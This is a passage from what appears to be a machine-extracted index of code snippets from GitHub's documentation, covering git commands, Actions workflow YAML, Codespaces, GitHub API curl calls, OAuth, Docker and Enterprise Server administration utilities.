{entra_token}\"\n```\n\n----------------------------------------\n\nTITLE: Making a Script Executable (Windows)\nDESCRIPTION: Marks the `goodbye.sh` script as executable using `git add --chmod=+x`. This is essential for allowing the script to be executed as a program within the composite action on Windows systems. The `--chmod=+x` option modifies the file's permissions to allow execution.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngit add --chmod=+x -- goodbye.sh\n```\n\n----------------------------------------\n\nTITLE: Remove Unused Packages - apt autoremove\nDESCRIPTION: This command removes packages that are no longer needed by the system, freeing up storage space in the GitHub Codespaces environment. It uses `sudo` for elevated privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-creation-and-deletion-of-codespaces.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo apt autoremove\n```\n\n----------------------------------------\n\nTITLE: Refactoring JavaScript Function to Arrow Notation\nDESCRIPTION: This JavaScript function `listRepos` is refactored using arrow notation and more descriptive parameter names. It fetches a list of repositories for a given organization from the GitHub API. It takes the organization name (`org`) and the number of repositories per page (`perPage`) as input. It returns a promise that resolves to the JSON data containing the list of repositories.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst listRepos = (org, perPage) => {\n return fetch(`https://api.github.com/orgs/${org}/repos?per_page=${parseInt(perPage)}`)\n   .then(response => response.json())\n   .then(data => data);\n};\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: cURL\nDESCRIPTION: This code snippet demonstrates how to use the `curl` tag to display content relevant to cURL commands. It wraps instructions specific to using cURL.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_13\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% curl %}\n\nThese instructions are pertinent to curl commands.\n\n{% endcurl %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Get Git Credential Helper Configuration\nDESCRIPTION: This command retrieves the configured credential helper from the Git configuration. It uses the `git config` command with the `--get` option to query the `credential.helper` setting. The output will display the configured credential helper, if any.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/git/confirm-credential-manager.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit config --get credential.helper\n```\n\n----------------------------------------\n\nTITLE: Migrate GitLab Pipeline With Reusable Workflow Config (Shell)\nDESCRIPTION: This command migrates a GitLab pipeline using a reusable workflow configuration file. The `--config-file-path` argument specifies the path to the YAML configuration file. The `--target-url` argument specifies the target Github Repository.  This command creates pull requests for each unique repository defined in the config file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_14\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer migrate gitlab --project my-project-name --output-dir output/ --config-file-path config.yml --target-url https://github.com/my-org/my-repo\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_API_V4_URL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_API_V4_URL` to the GitHub Actions equivalent `${{ github.api_url }}`. This variable represents the base URL of the GitHub API.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_15\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.api_url }}\n```\n\n----------------------------------------\n\nTITLE: Overriding Experiment Control Group in Console\nDESCRIPTION: This JavaScript code snippet shows how to override the experiment control group in the Chrome DevTools console for testing purposes. It allows developers to force a user into either the treatment or control group for a specific experiment.\nSOURCE: https://github.com/github/docs/blob/main/src/events/components/experiments/README.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.overrideControlGroup(\"<experiment_key>\", \"treatment\" | \"control\");\n\n// Example to see original search experience\nwindow.overrideControlGroup(\"ai_search_experiment\", \"control\");\n```\n\n----------------------------------------\n\nTITLE: Importing from Team Foundation Version Control (TFVC)\nDESCRIPTION: This command imports data from Team Foundation Version Control (TFVC). See the documentation for more details and instructions.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_82\n\nLANGUAGE: shell\nCODE:\n```\ngit-import-tfs-raw\n```\n\n----------------------------------------\n\nTITLE: Request Authenticated User via REST API\nDESCRIPTION: This command uses `curl` to make a request to the GitHub REST API to retrieve information about the authenticated user. It includes the authorization header with a bearer token for authentication. The URL points to the `/user` endpoint. The expected output is a JSON response containing user details, including the `node_id`.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-global-node-ids.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -i --header \"Authorization: Bearer YOUR-TOKEN\" {% data variables.product.rest_url %}/user\n```\n\n----------------------------------------\n\nTITLE: Verifying AAAA Records with dig in Shell\nDESCRIPTION: This command uses the `dig` utility to query DNS records and verify that the AAAA records for an apex domain are correctly configured.  It filters the output to show only the answer section, displaying the IPv6 addresses the domain resolves to.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ dig EXAMPLE.COM +noall +answer -t AAAA\n> EXAMPLE.COM     3600    IN AAAA     2606:50c0:8000::153\n> EXAMPLE.COM     3600    IN AAAA     2606:50c0:8001::153\n> EXAMPLE.COM     3600    IN AAAA     2606:50c0:8002::153\n> EXAMPLE.COM     3600    IN AAAA     2606:50c0:8003::153\n```\n\n----------------------------------------\n\nTITLE: Runner Requirements for Java\nDESCRIPTION: Self-hosted runners for Java analysis require the appropriate JDK versions to be installed.  Single Java version projects need the JDK in the PATH. Multiple Java version projects can use the `toolchains.xml` file to specify JDK locations and versions, and `mvn`, `gradle`, and `ant` executables should be available on the PATH.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_12\n\n\n\n----------------------------------------\n\nTITLE: Mapping GITLAB_USER_NAME to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `GITLAB_USER_NAME` to the GitHub Actions equivalent `${{ github.actor }}`. Get the user name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_54\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.actor }}\n```\n\n----------------------------------------\n\nTITLE: Retrieving a Group via SCIM REST API\nDESCRIPTION: This snippet represents the HTTP GET request used to retrieve an existing group for an enterprise in GitHub using the SCIM API. The `id` from the POST request used to create the group is required as a parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/provisioning-users-and-groups-with-scim-using-the-rest-api.md#_snippet_3\n\nLANGUAGE: HTTP\nCODE:\n```\nGET /scim/v2/{% ifversion ghec %}enterprises/{enterprise}/{% endif %}Groups/{scim_group_id}\n```\n\n----------------------------------------\n\nTITLE: Listing Docker Images\nDESCRIPTION: This snippet shows the output when using the `docker images` command. This command lists the Docker images that are available on the local system, including their repository, tag, image ID, creation date, and size.  The lines starting with `>` are example outputs.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/connecting-a-repository-to-a-package.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ docker images\n> REPOSITORY          TAG         IMAGE ID       CREATED         SIZE\n> hello_docker        latest      142e665b1faa   5 seconds ago   125MB\n> redis               latest      afb5e116cac0   3 months ago    111MB\n> alpine              latest      a6215f271958   5 months ago    5.29MB\n```\n\n----------------------------------------\n\nTITLE: Checking Blob Storage Connection for GHES Registry\nDESCRIPTION: This command validates the blob storage provider configuration for {% data variables.product.prodname_registry %} on {% data variables.location.product_location %}. If a connection was previously configured, running the command without parameters will perform the tests. A successful test will output \"All Storage tests passed\".\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_72\n\nLANGUAGE: shell\nCODE:\n```\nghe-check-blob-connection --help\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-check-blob-connection\n```\n\nLANGUAGE: shell\nCODE:\n```\nAll Storage tests passed\n```\n\n----------------------------------------\n\nTITLE: Matrix with Include Only YAML\nDESCRIPTION: This snippet demonstrates a GitHub Actions workflow where the `matrix` strategy is used with only the `include` keyword. This allows defining specific job configurations without needing a fully populated matrix. In this example, two jobs will run, one for each entry under the `include` key, with custom `site` and `datacenter` parameters.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/matrix-add-with-include.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  includes_only:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        include:\n          - site: \"production\"\n            datacenter: \"site-a\"\n          - site: \"staging\"\n            datacenter: \"site-b\"\n```\n\n----------------------------------------\n\nTITLE: Merge Remote as Subtree (Git >= 2.9)\nDESCRIPTION: Merges the specified remote branch as a subtree using the 'ours' merge strategy. This prepares Git for adding the remote repository's history as a subdirectory without immediately changing local files. `--no-commit` prevents committing and `--allow-unrelated-histories` allows merging unrelated histories.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit merge -s ours --no-commit --allow-unrelated-histories spoon-knife/main\n```\n\n----------------------------------------\n\nTITLE: Stopping a Codespace using GitHub CLI\nDESCRIPTION: This command stops a running codespace. The `-c` flag is used to specify the codespace name. If the flag is omitted, a list of available codespaces is shown for selection. Stopping a codespace releases the allocated resources.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace stop -c CODESPACE-NAME\n```\n\n----------------------------------------\n\nTITLE: Attaching a data disk to a GitHub Enterprise Server VM - Shell\nDESCRIPTION: This command attaches a new unencrypted data disk to a virtual machine (VM) on Azure. It requires specifying the VM name, resource group, premium storage SKU, disk size, and a name for the resulting VHD. The `az vm disk attach` command creates and attaches the disk with the specified configurations, including enabling read/write caching for optimal I/O performance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-azure.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\naz vm disk attach --vm-name VM_NAME -g RESOURCE_GROUP --sku Premium_LRS --new -z SIZE_IN_GB --name ghe-data.vhd --caching ReadWrite\n```\n\n----------------------------------------\n\nTITLE: Displaying Git Commit Details with git show\nDESCRIPTION: This command uses `git show` with the `--pretty=fuller` option to display detailed information about a specific commit, including the author date and commit date. This is useful for identifying discrepancies between the two dates which can cause issues with timeline display on GitHub.  The `YOUR_COMMIT_SHA_NUMBER` placeholder must be replaced with the actual SHA of the commit you're investigating.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-github-profile/managing-contribution-settings-on-your-profile/troubleshooting-commits-on-your-timeline.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git show YOUR_COMMIT_SHA_NUMBER --pretty=fuller\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Syntax for Steps and Actions (YAML)\nDESCRIPTION: This YAML snippet illustrates how to define steps and actions in a GitHub Actions workflow. It uses the `actions/setup-python` action to set up Python and then executes a Python script.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  run_python:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: '3.7'\n          architecture: 'x64'\n      - run: python script.py\n```\n\n----------------------------------------\n\nTITLE: Upgrading a GitHub Enterprise Node (Shell)\nDESCRIPTION: This command upgrades a single node in the GitHub Enterprise Server cluster. It is run on each node, including the primary MySQL node, and requires the package filename as an argument. It depends on the `ghe-upgrade` command line utility.  The node will reboot after the upgrade completes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/upgrading-a-cluster.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-upgrade PACKAGE-FILENAME.pkg\n> *** verifying upgrade package signature...\n>  497MB 0:00:04 [ 117MB/s] [==========================================>] 100%\n> gpg: Signature made Fri 19 Feb 2016 02:33:50 PM UTC using RSA key ID 0D65D57A\n> gpg: checking the trustdb\n> gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model\n> gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u\n> gpg: Good signature from \"GitHub Enterprise (Upgrade Package Key) > <enterprise@github.com>\"\n```\n\n----------------------------------------\n\nTITLE: Searching for Exact Code Text\nDESCRIPTION: This snippet illustrates how code search interprets text without proper separation. It will attempt to find the exact string, including parentheses and quotes.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_29\n\nLANGUAGE: text\nCODE:\n```\nprintf(\"hello world\\n\");\n```\n\n----------------------------------------\n\nTITLE: Listing remote repositories with Git\nDESCRIPTION: Lists the configured remote repositories for the current Git repository, displaying both fetch and push URLs. This command helps identify the existing remotes, such as 'origin', associated with the fork.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/configuring-a-remote-repository-for-a-fork.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit remote -v\n```\n\n----------------------------------------\n\nTITLE: Initializing Sinatra Authentication with Github\nDESCRIPTION: This Ruby snippet sets up authentication for a Sinatra application using the `sinatra-auth-github` gem.  It configures the GitHub client ID, secret, scopes, and callback URL.  It also includes a route that authenticates the user if they are not already authenticated, storing the access token.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'sinatra/auth/github'\n\nmodule Example\n  class MyGraphApp < Sinatra::Base\n    # !!! DO NOT EVER USE HARD-CODED VALUES IN A REAL APP !!!\n    # Instead, set and test environment variables, like below\n    # if ENV['GITHUB_CLIENT_ID'] && ENV['GITHUB_CLIENT_SECRET']\n    #  CLIENT_ID        = ENV['GITHUB_CLIENT_ID']\n    #  CLIENT_SECRET    = ENV['GITHUB_CLIENT_SECRET']\n    # end\n\n    CLIENT_ID = ENV['GH_GRAPH_CLIENT_ID']\n    CLIENT_SECRET = ENV['GH_GRAPH_SECRET_ID']\n\n    enable :sessions\n\n    set :github_options, {\n      :scopes    => \"repo\",\n      :secret    => CLIENT_SECRET,\n      :client_id => CLIENT_ID,\n      :callback_url => \"/\"\n    }\n\n    register Sinatra::Auth::Github\n\n    get '/' do\n      if !authenticated?\n        authenticate!\n      else\n        access_token = github_user[\"token\"]\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Example Copilot Usage Metrics Output in JSON\nDESCRIPTION: This JSON snippet represents the output of the JavaScript code, showing Copilot usage metrics for an organization, calculated on a weekly basis. It includes the number of days, total active users, total engaged users, and average active and engaged users for each week.  It provides a snapshot of how the data is structured after the API call and processing.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/analyzing-usage-over-time-with-the-copilot-metrics-api.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  week1: {\n    days: 7,\n    activeUsers: 174,\n    engagedUsers: 174,\n    avgActiveUsers: '24.86',\n    avgEngagedUsers: '24.86'\n  },\n  week2: {\n    days: 7,\n    activeUsers: 160,\n    engagedUsers: 151,\n    avgActiveUsers: '22.86',\n    avgEngagedUsers: '21.57'\n  },\n  week3: {\n    days: 7,\n    activeUsers: 134,\n    engagedUsers: 123,\n    avgActiveUsers: '19.14',\n    avgEngagedUsers: '17.57'\n  },\n  week4: {\n    days: 6,\n    activeUsers: 143,\n    engagedUsers: 132,\n    avgActiveUsers: '23.83',\n    avgEngagedUsers: '22.00'\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Requesting JWT using Actions core toolkit (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to request a JSON Web Token (JWT) from {% data variables.product.prodname_dotcom %}'s OIDC provider using the `actions/github-script` action along with the `@actions/core` toolkit.  It installs the necessary packages and uses `core.getIDToken()` to retrieve the token, setting it as an output for later steps.  The environment is set to Production.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job:\n    environment: Production\n    runs-on: ubuntu-latest\n    steps:\n    - name: Install OIDC Client from Core Package\n      run: npm install @actions/core@1.6.0 @actions/http-client\n    - name: Get Id Token\n      uses: {% data reusables.actions.action-github-script %}\n      id: idtoken\n      with:\n        script: |\n          const coredemo = require('@actions/core')\n          let id_token = await coredemo.getIDToken()\n          coredemo.setOutput('id_token', id_token)\n```\n\n----------------------------------------\n\nTITLE: Configuring devcontainer.json for Java in GitHub Codespaces\nDESCRIPTION: This code snippet defines the `devcontainer.json` file used to configure a Java development environment in GitHub Codespaces. It specifies the Java image, installs Maven and Ant, and configures VS Code extensions. The `postCreateCommand` property creates a new file after the container is created.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-java-project-for-codespaces.md#_snippet_0\n\nLANGUAGE: jsonc\nCODE:\n```\n// For format details, see https://aka.ms/devcontainer.json. For config options, see the\n// README at: https://github.com/devcontainers/templates/tree/main/src/java\n{\n  \"name\": \"Java\",\n  // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n  \"image\": \"mcr.microsoft.com/devcontainers/java:0-17\",\n\n  \"features\": {\n    \"ghcr.io/devcontainers/features/java:1\": {\n      \"version\": \"none\",\n      \"installMaven\": \"true\",\n      \"installGradle\": \"false\"\n    },\n    \"ghcr.io/devcontainers-contrib/features/ant-sdkman:2\": {}\n  }\n\n  // Use 'forwardPorts' to make a list of ports inside the container available locally.\n  // \"forwardPorts\": [],\n\n  // Use 'postCreateCommand' to run commands after the container is created.\n  // \"postCreateCommand\": \"java -version\",\n\n  // Configure tool-specific properties.\n  // \"customizations\": {},\n\n  // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n  // \"remoteUser\": \"root\"\n}\n\n```\n\n----------------------------------------\n\nTITLE: Querying Project Fields with curl\nDESCRIPTION: This snippet uses curl to query the first 20 fields of a GitHub project. It returns the ID, name, settings, and configuration for each field. The `PROJECT_ID` placeholder needs to be replaced with the actual project ID and `TOKEN` with a personal access token.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"query{ node(id: \\\"PROJECT_ID\\\") { ... on ProjectV2 { fields(first: 20) { nodes { ... on ProjectV2Field { id name } ... on ProjectV2IterationField { id name configuration { iterations { startDate id }}} ... on ProjectV2SingleSelectField { id name options { id name }}}}}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Searching models by custom license on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that use a custom license using the `license` qualifier.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_18\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=license:custom&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Fetching API V1 with curl and hostname replacement\nDESCRIPTION: This shell code snippet uses curl to make a request to the `/api/v1` endpoint. The `HOSTNAME` placeholder will be dynamically replaced if the `replacedomain` annotation is present in the code fence, using the user's hostname from their cookie. It depends on curl being installed on the system.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/replace-domain.md#_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://HOSTNAME/api/v1\n```\n\n----------------------------------------\n\nTITLE: Valid Path Filter - YAML\nDESCRIPTION: This example shows the correct syntax for specifying a path filter in a workflow configuration. The pattern `'**/README.md'` is enclosed in quotes to avoid YAML parsing errors due to the `*` character.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_38\n\nLANGUAGE: yaml\nCODE:\n```\n# Valid\npaths:\n  - '**/README.md'\n```\n\n----------------------------------------\n\nTITLE: Exchanging Code for Access Token via POST - OAuth\nDESCRIPTION: This code snippet shows how to exchange a temporary code received after user authorization for an access token using a POST request to the `/login/oauth/access_token` endpoint. It is a key step in completing the OAuth web application flow.  The `client_id`, `client_secret`, `code`, and `redirect_uri` parameters are essential for securely obtaining the access token.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_1\n\nLANGUAGE: HTTP\nCODE:\n```\nPOST {% data variables.product.oauth_host_code %}/login/oauth/access_token\n```\n\n----------------------------------------\n\nTITLE: Testing SNMP v2c Configuration\nDESCRIPTION: This command tests the SNMP v2c configuration by querying the system time on the GitHub Enterprise host. It requires the community string and the hostname (IP or domain) of the Enterprise instance as parameters. The command returns the system time if the configuration is successful.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/monitoring-using-snmp.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ snmpget -v 2c -c COMMUNITY-STRING -O e HOSTNAME hrSystemDate.0\n```\n\n----------------------------------------\n\nTITLE: Executing gh command\nDESCRIPTION: This snippet shows how to execute the gh command to view all top-level GitHub CLI commands. No dependencies are required. It is executed directly in the shell.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/github-cli-reference.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh\n```\n\n----------------------------------------\n\nTITLE: Enabling Trace Logging in JetBrains IDEs\nDESCRIPTION: This snippet shows how to enable trace-level logging for GitHub Copilot in JetBrains IDEs. Adding `#com.github.copilot:trace` to the Custom Debug Log Configuration will enable verbose logging, useful for debugging network-related issues. Remember to disable after debugging.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/troubleshooting-github-copilot/viewing-logs-for-github-copilot-in-your-environment.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n#com.github.copilot:trace\n```\n\n----------------------------------------\n\nTITLE: Updated Documentation for Product Retrieval - TypeScript\nDESCRIPTION: This is the updated documentation for the `getByCategoryName` function, reflecting the addition of pagination and the inclusion of recent reviews. The documentation clarifies the purpose of `page` and `pageSize` parameters, and specifies that the function now includes 5 recent reviews in the returned product objects. It also explicitly mentions the potential `PrismaClientKnownRequestError` that can be thrown.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/documenting-code/syncing-documentation-with-code-changes.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\n/**\n * Retrieves all products belonging to a specific category with pagination and recent reviews.\n *\n * @param categoryId - The unique identifier of the product category\n * @param page - The page number for pagination (default: 1)\n * @param pageSize - Number of products per page (default: 10)\n * @returns Promise that resolves to an array of Product objects with their 5 most recent reviews\n *\n * @example\n * const products = await getByCategoryName(5, 2, 20);\n * // Returns: [{id: 1, name: \"Product 1\", categoryId: 5, reviews: [...5 recent reviews]}, ...]\n *\n * @throws {PrismaClientKnownRequestError} If database query fails\n * @see {@link https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#findmany}\n */\n```\n\n----------------------------------------\n\nTITLE: Testing CodeQL CLI Configuration with Extraction Root\nDESCRIPTION: This shell command verifies that the CodeQL CLI is correctly configured to create and analyze databases when the `codeql` executable is not on the `PATH`. It checks for available CodeQL packs, listing their versions and locations within the extracted bundle. The command's output helps diagnose issues with query pack locations.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/setting-up-the-codeql-cli.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n/<extraction root>/codeql/codeql resolve packs\n```\n\n----------------------------------------\n\nTITLE: Conditional execution of post action using post-if in YAML\nDESCRIPTION: This example configures a conditional execution of the `post` action for a JavaScript action in YAML. It shows how to run the action only on linux-based runners using the `post-if` condition.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\n  post: 'cleanup.js'\n  post-if: runner.os == 'linux'\n```\n\n----------------------------------------\n\nTITLE: Building a Docker Image\nDESCRIPTION: This command builds a Docker image from the Dockerfile located in the current directory, tagging it as `hello_docker`. The `docker build` command is used to create the image, and the `-t` flag assigns a name to it.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/connecting-a-repository-to-a-package.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ndocker build -t hello_docker .\n```\n\n----------------------------------------\n\nTITLE: Example Markdown issue template\nDESCRIPTION: This snippet shows an example of a Markdown issue template with pre-defined sections for bug reporting.  It includes fields for current behavior, expected behavior, steps to reproduce, environment, and additional context.  The template uses HTML-style comments (`<!-- -->`) to provide guidance within each section.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-issue-forms.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n---\nname: 🐞 Bug\nabout: File a bug/issue\ntitle: '[BUG] <title>'\nlabels: Bug, Needs Triage\nassignees: ''\n\n---\n\n{% raw %}<{% endraw %}!--\nNote: Please search to see if an issue already exists for the bug you encountered.\n--{% raw %}>{% endraw %}\n\n### Current Behavior:\n{% raw %}<{% endraw %}!-- A concise description of what you're experiencing. --{% raw %}>{% endraw %}\n\n### Expected Behavior:\n{% raw %}<{% endraw %}!-- A concise description of what you expected to happen. --{% raw %}>{% endraw %}\n\n### Steps To Reproduce:\n{% raw %}<{% endraw %}!--\nExample: steps to reproduce the behavior:\n1. In this environment...\n1. With this config...\n1. Run '...'\n1. See error...\n--{% raw %}>{% endraw %}\n\n### Environment:\n{% raw %}<{% endraw %}!--\nExample:\n- OS: Ubuntu 20.04\n- Node: 13.14.0\n- npm: 7.6.3\n--{% raw %}>{% endraw %}\n\n### Anything else:\n{% raw %}<{% endraw %}!--\nLinks? References? Anything that will give us more context about the issue that you are encountering!\n--{% raw %}>{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Writing to a file using shell redirection\nDESCRIPTION: This shell command writes a string to a README.md file using output redirection. It appends \"info about this project\" to the README.md file. This command can be used to quickly add content to a file from the command line.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/quickstart-for-repositories.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\necho \"info about this project\" >> README.md\n```\n\n----------------------------------------\n\nTITLE: Checking Elasticsearch Audit Log Size\nDESCRIPTION: This command retrieves the size in bytes of the Elasticsearch audit log indices. The output can be used to estimate the amount of disk space the MySQL audit logs will need after migrating audit logs to MySQL during an upgrade to GitHub Enterprise Server 2.17. Requires `curl` and `jq` to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/upgrading-your-instance/preparing-to-upgrade/upgrade-requirements.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -s http://localhost:9201/audit_log/_stats/store | jq ._all.primaries.store.size_in_bytes\n```\n\n----------------------------------------\n\nTITLE: Suspending User via Command Line\nDESCRIPTION: This code snippet demonstrates the command to suspend a user on GitHub Enterprise Server using the `ghe-user-suspend` utility. Replace `USERNAME` with the actual username of the user to be suspended. This command must be run via SSH on the GitHub Enterprise Server instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/suspending-and-unsuspending-users.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-user-suspend USERNAME\n```\n\n----------------------------------------\n\nTITLE: Creating a Commit Message with Trailer (CLI)\nDESCRIPTION: This shell script demonstrates how to create a commit message with the 'on-behalf-of' trailer using `git commit -m`. The commit message includes a description, followed by two empty lines, and then the 'on-behalf-of' trailer. Ensure there are two newlines between the end of your commit description and the commit trailer.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/creating-a-commit-on-behalf-of-an-organization.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git commit -m \"Refactor usability tests.\n>\n>\non-behalf-of: @ORG NAME@ORGANIZATION.COM\"\n```\n\n----------------------------------------\n\nTITLE: YAML Frontmatter Example for Video Transcript\nDESCRIPTION: This YAML snippet demonstrates the required frontmatter properties for a transcript article, including the title, YouTube video URL, and link to the transcript file within the `video-transcripts` directory.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-videos-in-github-docs.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: Example product landing page\nproduct_video: 'https://www.youtube-nocookie.com/embed/URL'\nproduct_video_transcript: 